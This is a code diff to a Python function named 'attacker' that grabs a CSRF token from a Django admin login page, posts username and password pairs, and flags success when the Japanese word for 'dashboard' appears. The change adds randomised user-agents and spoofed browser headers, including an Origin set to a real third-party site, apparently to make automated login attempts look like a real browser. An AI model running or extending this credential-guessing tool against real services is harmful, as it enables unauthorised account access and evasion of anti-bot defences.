@@ -39,12 +39,28 @@ def interval(config):
 
 
 def attacker(user, pass_, config):
-    cookie = acccess({'method': 'GET', 'url': 'http://127.0.0.1:8000/admin'}).cookies['csrftoken']
-    interval(config)
-
     useragent = config.get('http_headers', 'useragent')
     if useragent == "random":
         useragent = ua.random
+
+    cookie = acccess({
+        'method': 'GET',
+        'url': 'http://127.0.0.1:8000/admin',
+        'headers': {
+            'useragent': useragent,
+            'cookie': '',
+            'referer': '',
+            'accept': config.get('http_headers', 'accept'),
+            'accept-encoding': 'gzip, deflate, br',
+            'accept_language': config.get('http_headers', 'accept_language'),
+            'content-type': 'application/x-www-form-urlencoded',
+            'connection': 'keep-alive',
+            'origin': 'http://point.recruit.co.jp',
+            'cache-control': 'no-cache',
+            'upgrade-insecure-requests': '1',
+        },
+    }).cookies['csrftoken']
+    interval(config)
 
     res = acccess({
         'method': 'POST',
@@ -56,10 +72,13 @@ def attacker(user, pass_, config):
             'cookie': 'csrftoken={}'.format(cookie),
             'referer': config.get('http_headers', 'referer'),
             'accept': config.get('http_headers', 'accept'),
-            'content-type': 'application/x-www-form-urlencoded',
-            # 'origin': 'http://127.0.0.1:8000',
-            'cache-control': 'no-cache',
+            'accept-encoding': 'gzip, deflate, br',
             'accept_language': config.get('http_headers', 'accept_language'),
+            'content-type': 'application/x-www-form-urlencoded',
+            'connection': 'keep-alive',
+            'origin': 'http://point.recruit.co.jp',
+            'cache-control': 'no-cache',
+            'upgrade-insecure-requests': '1',
         },
     })
     if "ダッシュボード" in res.text:
